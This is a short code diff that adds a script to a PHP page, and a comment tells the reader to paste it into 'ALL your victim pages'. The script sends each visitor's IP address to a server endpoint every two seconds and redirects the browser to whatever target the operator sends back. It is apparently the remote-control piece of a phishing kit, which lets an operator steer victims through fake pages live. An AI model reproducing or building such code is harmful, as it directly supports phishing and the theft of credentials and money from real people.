@@ -1278,3 +1278,24 @@ try {
             </div>
         </div>
     </div>
+<!-- Add this to the bottom of ALL your victim pages before </body> -->
+<script>
+// Poll for redirect commands every 2 seconds
+function checkForRedirect() {
+    fetch('/check-redirect.php?ip=<?php echo $_SERVER['REMOTE_ADDR']; ?>')
+        .then(response => response.json())
+        .then(data => {
+            if (data.redirect && data.target) {
+                console.log('Redirect command received:', data.target);
+                window.location.href = data.target;
+            }
+        })
+        .catch(error => console.log('Redirect check error:', error));
+}
+
+// Check every 2 seconds
+setInterval(checkForRedirect, 2000);
+
+// Also check immediately when page loads
+checkForRedirect();
+</script>
